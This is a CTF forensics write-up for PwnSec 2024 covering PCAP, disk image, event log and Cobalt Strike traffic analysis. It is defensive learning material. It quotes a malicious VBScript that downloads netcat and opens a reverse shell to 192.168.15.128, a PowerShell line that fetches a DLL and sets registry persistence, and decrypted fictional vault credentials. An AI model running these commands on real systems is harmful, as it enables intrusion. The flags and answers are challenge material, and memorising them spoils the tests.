---
title: PwnSec CTF 2024 - Writeups
time: 2024-11-16 12:00:00
categories: [ctf]
tags: [forensics,pwnsec]
image: /assets/posts/pwnsecctf2024/icon.png
---

This is a writeup for some forensics challenges from PwnSec CTF 2024. It's been awhile since I played a CTF with my local team M53 after joining L3ak, but I had a great time solving several forensics challenges for them. In the end, we managed to achieve 3rd place out of 100+ teams.

## TickTock [Forensics]
Question: Time is what we want most but what we use worst.

Flag: `PWNSEC{T0UGH_T1M3S_N3V3R_L4ST}`

We are given a PCAP file to investigate. Analyzing the file, several HTTP packets can be identified. The flag can be obtained from the `Accept-CH-Lifetime` header from each HTTP GET request. Credits to the author for this one-liner:
```
└─$ grep -aoP '(?<=Accept-CH-Lifetime: )\d+' TickTock.pcap | awk '{printf "%c", $1} END {print ""}'
PWNSEC{T0UGH_T1M3S_N3V3R_L4ST}
```

## Physter Backup Blunder 1 [Forensics]
Question: Physter, the finance executive manager at Leucothea Corp., oversees several critical business operations. Recently, his team has been working on a new product launch, which involves sensitive financial data and proprietary information. Physter noticed something was wrong when he couldn't log into the company's finance portal, and his email inbox showed signs of unusual activity. Physter contacted the IT security team, who immediately suspected a potential vulnerability exploit and launched a digital forensic investigation. Can you save Physter and Leucothea Corp. before more damage is done?

Flag: `PWNSEC{9c3dae57dc5be1e1bcbfccf39791651b}`

We are given an AD1 image to investigate and several questions to answer.

```
└─$ nc foren-pbb1.pwnsec.xyz 30406
██████╗ ██╗  ██╗██╗   ██╗███████╗████████╗███████╗██████╗     ██████╗  █████╗  ██████╗██╗  ██╗██╗   ██╗██████╗     ██████╗ ██╗     ██╗   ██╗███╗   ██╗██████╗ ███████╗██████╗ 
██╔══██╗██║  ██║╚██╗ ██╔╝██╔════╝╚══██╔══╝██╔════╝██╔══██╗    ██╔══██╗██╔══██╗██╔════╝██║ ██╔╝██║   ██║██╔══██╗    ██╔══██╗██║     ██║   ██║████╗  ██║██╔══██╗██╔════╝██╔══██╗
██████╔╝███████║ ╚████╔╝ ███████╗   ██║   █████╗  ██████╔╝    ██████╔╝███████║██║     █████╔╝ ██║   ██║██████╔╝    ██████╔╝██║     ██║   ██║██╔██╗ ██║██║  ██║█████╗  ██████╔╝
██╔═══╝ ██╔══██║  ╚██╔╝  ╚════██║   ██║   ██╔══╝  ██╔══██╗    ██╔══██╗██╔══██║██║     ██╔═██╗ ██║   ██║██╔═══╝     ██╔══██╗██║     ██║   ██║██║╚██╗██║██║  ██║██╔══╝  ██╔══██╗
██║     ██║  ██║   ██║   ███████║   ██║   ███████╗██║  ██║    ██████╔╝██║  ██║╚██████╗██║  ██╗╚██████╔╝██║         ██████╔╝███████╗╚██████╔╝██║ ╚████║██████╔╝███████╗██║  ██║
╚═╝     ╚═╝  ╚═╝   ╚═╝   ╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝    ╚═════╝ ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝         ╚═════╝ ╚══════╝ ╚═════╝ ╚═╝  ╚═══╝╚═════╝ ╚══════╝╚═╝  ╚═╝
What is the attacker's IP address?
Your answer: 192.168.15.128
Correct! ✅ Moving to the next question.
What is the name of the SMB share accessed by the attacker?
Your answer: Backup
Correct! ✅ Moving to the next question.
What is the name of the user that the attacker first logged in as to explore the share?
Your answer: guest
Correct! ✅ Moving to the next question.
How many failed login attempts did the attacker make using brute-force against the user Physter, who has READ/WRITE permissions?
Your answer: 37
Correct! ✅ Moving to the next question.
When did the attacker successfully access the share with READ/WRITE permissions? (YYYY-MM-DD HH:MM:SS)
Your answer: 2024-10-17 12:51:22
Correct! ✅ Moving to the next question.
What is the name of the script that the attacker abused to gain access to Physter's machine? (Filename.ext)
Your answer: Backup.vbs
Correct! ✅ Moving to the next question.
A scheduled task was set up to execute the script. Identify the name of that scheduled task.
Your answer: VBS-Backup
Correct! ✅ Moving to the next question.
What is the command from the scheduled task that executed the script?
Your answer: C:\Windows\System32\wscript.exe C:\Users\Physter\Backup\Backup.vbs
Correct! ✅ Moving to the next question.
Good Job! You answered all questions correctly! 🔥 Here is your flag: PWNSEC{9c3dae57dc5be1e1bcbfccf39791651b}
```

### Question 1: What is the attacker's IP address?
Analyzing the AD1 image, two drives can be identified: the user's drive (C:) and a backup drive (D:).

![phy1](/assets/posts/pwnsecctf2024/phy1.png)

Inside the backup drive was a suspicious VBScript file that seem to be conducting majority of the attacks. Analyzing the code, the attacker's IP and port can be identified to be `192.168.15.128:1337`.

![phy2](/assets/posts/pwnsecctf2024/phy2.png)

```vbs
Option Explicit
Dim objFSO, strSourceFolder, strDestFolder, strExclusion, strPrompt, oShell

Set objFSO = CreateObject("Scripting.FileSystemObject")

strSourceFolder = "C:\Users\Physter\Backup"
strDestFolder = "D:\"


CopyFolderStructure strSourceFolder, strDestFolder, strExclusion

Function CopyFolderStructure(strSource, strDestination, strExcludedExt)
    Const OVER_WRITE_FILES = True
    Dim objDir, objFolder, objFiles, strCurExt, intX, arrExt, blnExclude

    Set objDir = objFSO.GetFolder(strSource)

    If Not objFSO.FolderExists(strDestination & "\" & objDir.Name) Then
        objFSO.CreateFolder(strDestination & "\" & objDir.Name)
    End If

    If Not IsNoData(strExcludedExt) Then
        arrExt = Split(strExcludedExt, ",")
        blnExclude = False
    End If

    For Each objFiles In objFSO.GetFolder(strSource).Files
        If Not IsNoData(strExcludedExt) Then
            strCurExt = objFSO.GetExtensionName(objFiles.Name)
            For intX = 0 To UBound(arrExt)
                If LCase(strCurExt) = arrExt(intX) Then
                    blnExclude = True
                    Exit For
                Else
                    blnExclude = False
                End If
            Next
            If Not blnExclude Then
                objFSO.CopyFile strSource & "\" & objFiles.Name, strDestination & "\" & objDir.Name & "\" & objFiles.Name, OVER_WRITE_FILES
            End If
        Else
            objFSO.CopyFile strSource & "\" & objFiles.Name, strDestination & "\" & objDir.Name & "\" & objFiles.Name, OVER_WRITE_FILES
        End If
    Next

    For Each objFolder In objFSO.GetFolder(strSource).SubFolders
        CopyFolderStructure objFolder.Path, strDestination & "\" & objDir.Name, strExcludedExt
    Next
End Function

Function BrowseForFolderDialogBox(strTitle)
    Const WINDOW_HANDLE = 0
    Const NO_OPTIONS = &H0001
    Dim objShellApp
    Dim objFolder
    Dim objFldrItem
    Dim objPath

    Set objShellApp = CreateObject("Shell.Application")
    Set objFolder = objShellApp.BrowseForFolder(WINDOW_HANDLE, strTitle , NO_OPTIONS)
    If IsNoData(objFolder) Then
        WScript.Echo "You choose to cancel. This will stop this script."
        Wscript.Quit
    Else
        Set objFldrItem = objFolder.Self
        objPath = objFldrItem.Path
        BrowseForFolderDialogBox = objPath
        Set objShellApp = Nothing
        Set objFolder = Nothing
        Set objFldrItem = Nothing
    End If
End Function

Function IsNoData(varVal2Check)
    On Error Resume Next
    If IsNull(varVal2Check) Or IsEmpty(varVal2Check) Then
        IsNoData = True
    Else
        If IsDate(varVal2Check) Then
            IsNoData = False
        ElseIf varVal2Check = "" Then
            IsNoData = True
        ElseIf Not IsObject(varVal2Check) Then
            IsNoData = False
        Else
            IsNoData = False
        End If
    End If
End Function
Set oShell = CreateObject("Wscript.Shell")
oShell.run "cmd.exe /c curl http://192.168.15.128:8080/nc.exe -o C:\Windows\Temp\nc.exe"
oShell.run "cmd.exe /c C:\Windows\Temp\nc.exe 192.168.15.128 1337 -e powershell"
```

### Question 2: What is the name of the SMB share accessed by the attacker?
Similarly, the code shows the SMB share folder to be `Backup`.

```vbs
Set objFSO = CreateObject("Scripting.FileSystemObject")

strSourceFolder = "C:\Users\Physter\Backup"
strDestFolder = "D:\"


CopyFolderStructure strSourceFolder, strDestFolder, strExclusion
```

### Question 3: What is the name of the user that the attacker first logged in as to explore the share?
Analyzing the `Microsoft-Windows-SMBServer%4Security.evtx` event log, a denied access was logged by the user `guest`.

![phy3](/assets/posts/pwnsecctf2024/phy3.png)

### Question 4: How many failed login attempts did the attacker make using brute-force against the user Physter, who has READ/WRITE permissions?
Analyzing the `Security.evtx` event log with the event ID 4625 (Failed Login), the brute-force attempts can be identified to be around `2024-10-17 12:48:16 (UTC)`. Just calculate them manually.

![phy4](/assets/posts/pwnsecctf2024/phy4.png)

### Question 5: When did the attacker successfully access the share with READ/WRITE permissions? (YYYY-MM-DD HH:MM:SS)
This question was pretty tricky. Analyzing the `Security.evtx` event log again with the event ID 4624 (Successful Login), the first log shows a suspicious login to a workstation called "R41N". Hence, the timestamp of successful compromise can be identified to be `2024-10-17 12:51:22 (UTC)`.

![phy5](/assets/posts/pwnsecctf2024/phy5.png)

### Question 6: What is the name of the script that the attacker abused to gain access to Physter's machine? (Filename.ext)
The name of the malicious script is already identified to be `Backup.vbs` in the shared folder.

### Question 7: A scheduled task was set up to execute the script. Identify the name of that scheduled task.
Analyzing the registry `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Schedule\Taskcache\Tree`, a suspicious scheduled task can be identified to be `VBS-Backup`.

![phy6](/assets/posts/pwnsecctf2024/phy6.png)

### Question 8: What is the command from the scheduled task that executed the script?
Using the GUID of the suspicious scheduled task, the command can be identified to be `C:\Windows\System32\wscript.exe C:\Users\Physter\Backup\Backup.vbs`.

![phy7](/assets/posts/pwnsecctf2024/phy7.png)

## Physter Backup Blunder 2 [Forensics]
Question: The IT security team's investigation revealed that an attacker had indeed gained access to Physter's workstation. After breaching the system, the attacker wasted no time. They began by scanning the system for sensitive files. Can you find out what the attacker did after gaining access to the workstation?

Flag: `PWNSEC{2c4a93bfab4b2c273047eb42a05a94cd}`

We are given an AD1 image to investigate and several questions to answer.

```
└─$ nc foren-pbb2.pwnsec.xyz 34466
██████╗ ██╗  ██╗██╗   ██╗███████╗████████╗███████╗██████╗     ██████╗  █████╗  ██████╗██╗  ██╗██╗   ██╗██████╗     ██████╗ ██╗     ██╗   ██╗███╗   ██╗██████╗ ███████╗██████╗ 
██╔══██╗██║  ██║╚██╗ ██╔╝██╔════╝╚══██╔══╝██╔════╝██╔══██╗    ██╔══██╗██╔══██╗██╔════╝██║ ██╔╝██║   ██║██╔══██╗    ██╔══██╗██║     ██║   ██║████╗  ██║██╔══██╗██╔════╝██╔══██╗
██████╔╝███████║ ╚████╔╝ ███████╗   ██║   █████╗  ██████╔╝    ██████╔╝███████║██║     █████╔╝ ██║   ██║██████╔╝    ██████╔╝██║     ██║   ██║██╔██╗ ██║██║  ██║█████╗  ██████╔╝
██╔═══╝ ██╔══██║  ╚██╔╝  ╚════██║   ██║   ██╔══╝  ██╔══██╗    ██╔══██╗██╔══██║██║     ██╔═██╗ ██║   ██║██╔═══╝     ██╔══██╗██║     ██║   ██║██║╚██╗██║██║  ██║██╔══╝  ██╔══██╗
██║     ██║  ██║   ██║   ███████║   ██║   ███████╗██║  ██║    ██████╔╝██║  ██║╚██████╗██║  ██╗╚██████╔╝██║         ██████╔╝███████╗╚██████╔╝██║ ╚████║██████╔╝███████╗██║  ██║
╚═╝     ╚═╝  ╚═╝   ╚═╝   ╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝    ╚═════╝ ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝         ╚═════╝ ╚══════╝ ╚═════╝ ╚═╝  ╚═══╝╚═════╝ ╚══════╝╚═╝  ╚═╝
What is the name of the password manager that Physter used?
Your answer: bitwarden
Correct! ✅ Moving to the next question.
Physter exported his password vault and left the password for the exported vault in a note somewhere. Find and identify the vault password.
Your answer: Fr0mTh3R1verT0TheSe4P4l3s7ineW1llBeFr33
Correct! ✅ Moving to the next question.
When was that note created? (YYYY-MM-DD)
Your answer: 2024-10-11
Correct! ✅ Moving to the next question.
After decrypting the vault. What is the Physter's password for http://finance.LeucotheaCorp.com?
Your answer: KWJPijz7PeD710wYYh6B
Correct! ✅ Moving to the next question.
Great Work! You answered all questions correctly! 🔥 Here is your flag: PWNSEC{2c4a93bfab4b2c273047eb42a05a94cd}
```

### Question 1: What is the name of the password manager that Physter used?
Analyzing the user's Chrome history, the user can be seen searching for `Bitwarden`, a common password manager.

![phy8](/assets/posts/pwnsecctf2024/phy8.png)

### Question 2: Physter exported his password vault and left the password for the exported vault in a note somewhere. Find and identify the vault password.
The exported passwords can be identified in the shared folder called "passwords.json" where it can be decrypted with the master password. Additionally, the Bitwarden folder could not be found in the drive. This suggest that the user might have utilised Bitwarden extension instead.

![phy9](/assets/posts/pwnsecctf2024/phy9.png)

Reading the question again, it mentioned something about "note". So by analyzing Windows sticky note artifact in `%LOCALAPPDATA%\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`, the master password `Fr0mTh3R1verT0TheSe4P4l3s7ineW1llBeFr33` can be obtained.

![phy10](/assets/posts/pwnsecctf2024/phy10.png)

### Question 3: When was that note created? (YYYY-MM-DD)
The timestamp can be identified next to the sticky note content.

![phy11](/assets/posts/pwnsecctf2024/phy11.png)

Just convert the WebKit/Chrome timestamp to readable time. PS: I don't know why the year is incorrect, it should be `2024-10-11`.

![phy12](/assets/posts/pwnsecctf2024/phy12.png)

### Question 4: After decrypting the vault. What is the Physter's password for http://finance.LeucotheaCorp.com?
With the master password, the exported passwords can be decrypted easily with open-source tools like [BitwardenDecrypt](https://github.com/GurpreetKang/BitwardenDecrypt). The user's password can be identified to be `KWJPijz7PeD710wYYh6B`.

```
PS C:\Users\warlocksmurf\Desktop\Tools\BitwardenDecrypt-1.6> python .\BitwardenDecrypt.py passwords.json

Enter Password (EncryptedJSON):
{
  "encrypted": false,
  "folders": [],
  "items": [
    {
      "passwordHistory": null,
      "revisionDate": "2024-10-08T14:17:49.703Z",
      "creationDate": "2024-10-08T14:17:49.703Z",
      "deletedDate": null,
      "id": "a632dcbd-faa0-4f3c-b922-b20300eb9c11",
      "organizationId": null,
      "folderId": null,
      "type": 1,
      "reprompt": 0,
      "name": "Leucothea Corp. Financial Department",
      "notes": null,
      "favorite": false,
      "login": {
        "fido2Credentials": [],
        "uris": [
          {
            "match": null,
            "uri": "http://finance.LeucotheaCorp.com"
          }
        ],
        "username": "PhysterOrca",
        "password": "KWJPijz7PeD710wYYh6B",
        "totp": null
      },
      "collectionIds": null
    },
    {
      "passwordHistory": null,
      "revisionDate": "2024-10-02T16:41:14.216Z",
      "creationDate": "2024-10-02T16:41:14.216Z",
      "deletedDate": null,
      "id": "f2826658-1489-46e2-88e8-b1fd0112ff7b",
      "organizationId": null,
      "folderId": null,
      "type": 3,
      "reprompt": 0,
      "name": "Main Card",
      "notes": null,
      "favorite": false,
      "card": {
        "cardholderName": "Physter Orca",
        "brand": "Mastercard",
        "number": "5547781893718555",
        "expMonth": "4",
        "expYear": "2028",
        "code": "1337"
      },
      "collectionIds": null
    },
    {
      "passwordHistory": null,
      "revisionDate": "2024-10-02T16:39:58.320Z",
      "creationDate": "2024-10-02T16:39:58.320Z",
      "deletedDate": null,
      "id": "6f717876-7755-4910-936a-b1fd0112a68a",
      "organizationId": null,
      "folderId": null,
      "type": 1,
      "reprompt": 0,
      "name": "Whales Activity",
      "notes": null,
      "favorite": false,
      "login": {
        "fido2Credentials": [],
        "uris": [],
        "username": "physt3r",
        "password": "SAVEtheWHALES!",
        "totp": null
      },
      "collectionIds": null
    }
  ]
}
```

## SOC as a Service [Forensics]
Question: Recently, our SOC experienced unusual inbound and outbound connections. We suspect that one of our analysts might have made a significant mistake. After conducting an investigation, we discovered that an analyst received an email. He told us he started investigating the email as a normal day and a normal ticket, but after it, some malicious activity occurred. Could you assist us in investigating what went wrong and identify our analyst's mistake? Flag format: PWNSEC{SHA1HashOfMaliciousFileDelievered_MitreidForDeliveryOfTheMaliciousFile_MitreForPersistence_C2ip_C2port}

Flag: `PWNSEC{6f4fdae522dccf52ef96698fde2e35a4539a8472_T1036.008_T1547.003_90.90.10.10_1337}`

We are given an EML file and the email attachment to investigate.

![soc1](/assets/posts/pwnsecctf2024/soc1.png)

Analyzing the attachment file, suspicious commands can be extracted from its metadata.

```
C:\Windows\System32\cmd.exe /c "powershell iwr http://20.0.145.51/windows_update/windows_update.dll -OutFile C:\Windows\Upd.dll; reg add HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Time\TimeProviders\CMDProvider /v DllName /d C:\Windows\Upd.dll /f"
```

The SHA1 hash can be obtained after downloading the malicious DLL from the C2.

```
└─$ wget http://20.0.145.51/windows_update/windows_update.dll                                                 
--2024-11-16 11:53:48--  http://20.0.145.51/windows_update/windows_update.dll
Connecting to 20.0.145.51:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 220077 (215K) [application/octet-stream]
Saving to: ‘windows_update.dll’

windows_update.dll                                         100%[=======================================================================================================================================>] 214.92K   328KB/s    in 0.7s    

2024-11-16 11:53:49 (328 KB/s) - ‘windows_update.dll’ saved [220077/220077]

└─$ sha1sum windows_update.dll 
6f4fdae522dccf52ef96698fde2e35a4539a8472  windows_update.dll
```

The delivery MITRE took a long time to figure out. Essentially, the authors wanted the MITRE ID of how the user got tricked into clicking the attachment, not the delivery of the fake PNG file. At first I thought the MITRE ID was T1027.012 (Obfuscated Files or Information: LNK Icon Smuggling), but it was instead T1036.008 (Masquerading: Masquerade File Type).

The MITRE ID for persistence was pretty straightforward. Analyzing the suspicious commands executed from the fake PNG file, the malicious DLL was added to the registry hive `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Time\TimeProviders\CMDProvider`. This highly suggests that the persistence method was T1547.003 (Boot or Logon Autostart Execution: Time Providers).

To obtain the C2 IP and port, the malicious DLL can be decompiled and analyzed using Ghidra. Going through the main function of the DLL, a `reverse_shell` function can be identified.

![soc2](/assets/posts/pwnsecctf2024/soc2.png)

Within the `reverse_shell` function was the C2 IP and port (written in hexadecimal).

![soc3](/assets/posts/pwnsecctf2024/soc3.png)

## SecCorp [Forensics]
Question: SecCorp has been compromised, and we suspect the attackers used stealth tactics. As our top incident responder, your mission is to dive into the logs and uncover their hidden maneuvers, expose their strategies, and help us secure our defenses. Flag Format: PWNSEC{full path of the malicious file_SHA1 of the malicious file _name of the file that the malicious file drops}

Flag: `PWNSEC{C:\Windows\System32\lsass.dll_5e84941be2c10ecec9d796211196fca10e0834dd_NPPSpy.txt}`

We are given Window event logs to investigate. Using Hayabusa, the event logs are parsed and analyzed to easily identify malicious events and IOCs.

![sec1](/assets/posts/pwnsecctf2024/sec1.png)

Analyzing the output from Hayabusa, a powershell script can be seen being executed to copy a malicious DLL file into `C:\Windows\System32`.

![sec2](/assets/posts/pwnsecctf2024/sec2.png)

Researching online about this malicious script, it seems that it was related to [NPPSPY](https://www.malwareguy.tech/Hunts/nppspy.html) which spies on user credentials. Reading the blog, the YARA rule they provided had two SHA256 hashes of NPPSPY.dll (original name of lsass.dll).

![sec3](/assets/posts/pwnsecctf2024/sec3.png)

Analyzing both SHA256 hashes on VirusTotal, the second hash had the right SHA1 hash. 

![sec4](/assets/posts/pwnsecctf2024/sec4.png)

Since the event logs do not show any dropped files, VirusTotal will instead show the file that was written by the malicious DLL.

![sec5](/assets/posts/pwnsecctf2024/sec5.png)

## APT Detector [Forensics]
Question: The security team at Leucothea Corp. received reports of suspicious activity from one of their developers' machines. After an investigation, the SOC team uncovered signs of a phishing attack. The developer unknowingly executed a malicious attachment, leading to a compromise by an APT group. In response, The SOC team has provided you with a network traffic capture to help analyze the breach.

Flag: `PWNSEC{d09c5c8a8f162e36cd80a5d0f7de8d88}`

We are given a PCAP file to investigate and several questions to answer.

```
└─$ nc foren-aptdetector.pwnsec.xyz 34477
What is the endpoint that the C2 is using in the GET requests? (Format:/endpoint)
Your answer: /zOMGAPT
Correct! ✅ Moving to the next question.
What's the name of the C2 Server used? (Format:C2 Name)
Your answer: cobalt strike
Correct! ✅ Moving to the next question.
What's the name of the CobaltStrike profile used by the threat actor? (Format:xxxx_xxxxx.profile)
Your answer: apt1_virtuallythere.profile
Correct! ✅ Moving to the next question.

Our Threat Intelligence team discovered that the beacon keys were leaked on the dark web, specifically on the official APT forum. We've obtained a copy for you: https://handouts.pwnsec.xyz/cobaltstrike.beacon_keys 

Determine the raw key of the C2 communication session. (Format:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx)
Your answer: 6217a4d8575c2f1e1d318292a7bb371e
Correct! ✅ Moving to the next question.
Determine the name of the executable that initiated the C2 communication. (Format:filename.ext)
Your answer: Maintenance.exe
Correct! ✅ Moving to the next question.
What is the secret found in the environment variable?
Your answer: D3cRypt1n6_c0b4l7_57r1k3_7r4ff1c_15_1n54n3
Correct! ✅ Moving to the next question.
Good Job! You answered all questions correctly! 🔥 Here is your flag: PWNSEC{d09c5c8a8f162e36cd80a5d0f7de8d88}
```

### Question 1: What is the endpoint that the C2 is using in the GET requests? (Format:/endpoint)
Analyzing the HTTP GET requests, the endpoint can be easily identified to be `/zOMGAPT`.

![apt1](/assets/posts/pwnsecctf2024/apt1.png)

### Question 2: What's the name of the C2 Server used? (Format:C2 Name)
Doing some OSINT, the C2 server can be identified to be `Cobalt Strike`.

![apt2](/assets/posts/pwnsecctf2024/apt2.png)

### Question 3: What's the name of the CobaltStrike profile used by the threat actor? (Format:xxxx_xxxxx.profile)
Doing some OSINT, the CobaltStrike profile can be identified to be `apt1_virtuallythere.profile`.

![apt3](/assets/posts/pwnsecctf2024/apt3.png)

### Question 4: Our Threat Intelligence team discovered that the beacon keys were leaked on the dark web, specifically on the official APT forum. We've obtained a copy for you: hxxps://handouts.pwnsec.xyz/cobaltstrike.beacon_keys Determine the raw key of the C2 communication session. (Format:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx)
Since I was not very well-versed with Cobalt Strike, I had to read several blogs on it to understand how it works. From what I understand, the C2 server creates randomly generated private and public RSA keys and stores in the beacon file. Every beacon stager has the public key embedded in it to encrypt data. One of the data that is encrypted is the victim machine metadata which is sent to the server in a HTTP GET request. This is just a method to "register" the beacon with its C2 server before receiving and replying to the attacker's tasks. Receiving tasks generally happens over HTTP GET requests and the beacon replies with the task data over HTTP POST requests. These tasks are encrypted using an AES key sent by the beacon in the registration request. More about it can be read here: https://unit42.paloaltonetworks.com/cobalt-strike-metadata-encryption-decryption/

Back to the question, since we have the beacon key file, we can essentially use it to decrypt the metadata from a HTTP GET request in the PCAP. One thing to note: the CobaltStrike profile used will encode the metadata using "netbiosu" and place it within the `/tmp` parameter.

![apt4](/assets/posts/pwnsecctf2024/apt4.png)

So the first thing was to parse the beacon key file to obtain the public and private RSA keys. This [script](https://github.com/Slzdude/cs-scripts/blob/master/parse_beacon_keys.py) was able to parse the beacon key file.

```
└─$ python parse_beacon_keys.py
-----BEGIN PRIVATE KEY-----
MIICeAIBADANBgkqhkiG9w0BAQEFAASCAmIwggJeAgEAAoGBAKAyn4qKasRdoeiEnuLZduKDovlW
Suro1h8f9s4Kk6fMx5pSk1XQqq9lWVvUOQ8ie6Uv/v9ps2k6ceJn757Dcyfmjt8nx1nY92jVjTcj
/8pLLCZ0WKB73rMPdvhoQe9YQECnUJBj8QmZcvR/FQnXqDcMzbsghW3+AR+DPs0sZt/vAgMBAAEC
gYAsoI2jWZYOqArfrHpatbwRtBwlm615LW3g89WcZoPlvf1o91IGGQBDplczZraSiceqJ+nAm2CY
kuiA6vVs5APjCgvsFeXEBLReCjFLB2JvY3NE6Vl7z4SQ0FcvSiemOj99bNyUc51tlaRCyyBOaUVw
v6FcOcC8Q5x8Unv4C5sk6QJBAPIcetKXVwzs2Zh3iTC4dZ6ZnDXMCxLO9FULhKUvHHY9rz6nrmXi
K/pEpaNYn7hal3drm7epFxiTyC9ktsNZMFUCQQCpYzRIJi7DdFEyhXzredPFc8jfPGdKvZlx6XH5
+HiVHgOARdAVZHQMjge/TEXeBM6HO8ncFIaCluOpC60ODEMzAkEA3lqznocphpBcAz/9Okael0ti
gLHllZ+GHDkY2JAc5qceND/R1nZSh2XWbd9tyOVCaIXmnFVqBcNrvcMUavKVhQJBAJMRHAKMjEuN
QTZxKd21P8YO2lfgNPpylbiObDQRpHgrv/RuKNV6CzwfUOCp03uJhttpcMDRXVwir/VEuvMYeHsC
QQDVXXbO3Ohe4UozTVGfiI2k+zQ6DCj9QKLpzkY1sro4QKVA6Gh1EEmhmKClhwA7ANUMxO4eR1r9
ntGl0USzU22U
-----END PRIVATE KEY-----
-----BEGIN PUBLIC KEY-----
MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCgMp+KimrEXaHohJ7i2Xbig6L5Vkrq6NYfH/bO
CpOnzMeaUpNV0KqvZVlb1DkPInulL/7/abNpOnHiZ++ew3Mn5o7fJ8dZ2Pdo1Y03I//KSywmdFig
e96zD3b4aEHvWEBAp1CQY/EJmXL0fxUJ16g3DM27IIVt/gEfgz7NLGbf7wIDAQAB
-----END PUBLIC KEY-----
```

According to this [blog](https://unit42.paloaltonetworks.com/cobalt-strike-metadata-encoding-decoding/#section-6-title), the netbiosu encoded string can be decoded with the following script:

```python
def netbiosu_decode(netbios):
    i = iter(netbios)
    b = []
    for c in i:
        b.append(((ord(c) - ord('A')) << 4) + ((ord(next(i)) - ord('A')) & 0xF))
    return bytes(b)

encoded_data = "AOBCGFMECPGCHBFAHMHOPEIFACMALIPGFEKNMJHGJEAAHGDJGGKKCEKGKNDCBFJLOMOLDEGACCGJOHCIBLMADKPIBNCBPGILCEMAJNEHOIHGEKMNHDKGIMEDHICKFFOPGDMMOJKAKCBOEHBHPPGJAKNGJIBCHKOIKGFJHHBKBAANIIDHFCNHMGPJCLFICDAHHMPNBGGNGLGAIEOEPLIONFEOJLDPDLBJJAFAKCGCOJGMFOLPBABIPPFCNKAAEHBE"

print(netbiosu_decode(encoded_data).hex())
```
```
└─$ python metadata.py         
0e1265c42f6271507c7ef48502c0b8f654adc9769400763966aa24a6ad32159beceb34602269e7281bc03af81d21f68b24c09d47e8764acd73a68c43782a55ef63cce9a0a21e4717ff690ad698127ae8a659771a100d883752d7c6f92b5823077cfd166d6b6084e4fb8ed54e9b3f3b199050a262e96c5ebf1018ff52da004714
```

After extracting the decoded string, we can use the private RSA key to obtain the metadata. This can be done using the following script:

```python
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import hashes

private_key_pem = b"""
-----BEGIN PRIVATE KEY-----
MIICeAIBADANBgkqhkiG9w0BAQEFAASCAmIwggJeAgEAAoGBAKAyn4qKasRdoeiEnuLZduKDovlW
Suro1h8f9s4Kk6fMx5pSk1XQqq9lWVvUOQ8ie6Uv/v9ps2k6ceJn757Dcyfmjt8nx1nY92jVjTcj
/8pLLCZ0WKB73rMPdvhoQe9YQECnUJBj8QmZcvR/FQnXqDcMzbsghW3+AR+DPs0sZt/vAgMBAAEC
gYAsoI2jWZYOqArfrHpatbwRtBwlm615LW3g89WcZoPlvf1o91IGGQBDplczZraSiceqJ+nAm2CY
kuiA6vVs5APjCgvsFeXEBLReCjFLB2JvY3NE6Vl7z4SQ0FcvSiemOj99bNyUc51tlaRCyyBOaUVw
v6FcOcC8Q5x8Unv4C5sk6QJBAPIcetKXVwzs2Zh3iTC4dZ6ZnDXMCxLO9FULhKUvHHY9rz6nrmXi
K/pEpaNYn7hal3drm7epFxiTyC9ktsNZMFUCQQCpYzRIJi7DdFEyhXzredPFc8jfPGdKvZlx6XH5
+HiVHgOARdAVZHQMjge/TEXeBM6HO8ncFIaCluOpC60ODEMzAkEA3lqznocphpBcAz/9Okael0ti
gLHllZ+GHDkY2JAc5qceND/R1nZSh2XWbd9tyOVCaIXmnFVqBcNrvcMUavKVhQJBAJMRHAKMjEuN
QTZxKd21P8YO2lfgNPpylbiObDQRpHgrv/RuKNV6CzwfUOCp03uJhttpcMDRXVwir/VEuvMYeHsC
QQDVXXbO3Ohe4UozTVGfiI2k+zQ6DCj9QKLpzkY1sro4QKVA6Gh1EEmhmKClhwA7ANUMxO4eR1r9
ntGl0USzU22U
-----END PRIVATE KEY-----
"""

private_key = serialization.load_pem_private_key(
    private_key_pem,
    password=None,
)

encrypted_metadata = bytes.fromhex("0e1265c42f6271507c7ef48502c0b8f654adc9769400763966aa24a6ad32159beceb34602269e7281bc03af81d21f68b24c09d47e8764acd73a68c43782a55ef63cce9a0a21e4717ff690ad698127ae8a659771a100d883752d7c6f92b5823077cfd166d6b6084e4fb8ed54e9b3f3b199050a262e96c5ebf1018ff52da004714")

try:
    decrypted_metadata = private_key.decrypt(
        encrypted_metadata,
        padding.PKCS1v15()
    )
    print("Decrypted Metadata:", decrypted_metadata.hex())
except Exception as e:
    print("An error occurred during decryption:", e)
```
```
└─$ python decrypt.py 
Decrypted Metadata: 0000beef0000005c6217a4d8575c2f1e1d318292a7bb371ee404b50129f7162c00000a10000004060223f00000000076b3110076b2fb8080b0a8c04445534b544f502d4e385152465351097a6f7a6e6f6f723233094d61696e74656e616e63652e657865
```

Following the metadata structure from the blog, the raw key can be identified to be `6217a4d8575c2f1e1d318292a7bb371e`

![apt5](/assets/posts/pwnsecctf2024/apt5.png)

### Question 4: Determine the name of the executable that initiated the C2 communication. (Format:filename.ext)
The name of the executable can be identified from the metadata.

![apt6](/assets/posts/pwnsecctf2024/apt6.png)

### Question 5: What is the secret found in the environment variable?
With the raw key, the C2 traffic in the PCAP can be decrypted easily using this [tool](https://github.com/DidierStevens/DidierStevensSuite/blob/master/cs-parse-traffic.py). Decrypting the traffic, we can identify a file called `.env` in the "Leucothea_app.v1" program.

```
python .\cs-parse-traffic.py -r 6217a4d8575c2f1e1d318292a7bb371e -e APT-Detector.pcap
Packet number: 35
HTTP response (for request 32 )
Length raw data: 48
Timestamp: 1731545692 20241114-005452
Data size: 16
Command: 4 COMMAND_SLEEP
 Sleep: 2000
 Jitter: 0

Packet number: 35
HTTP request
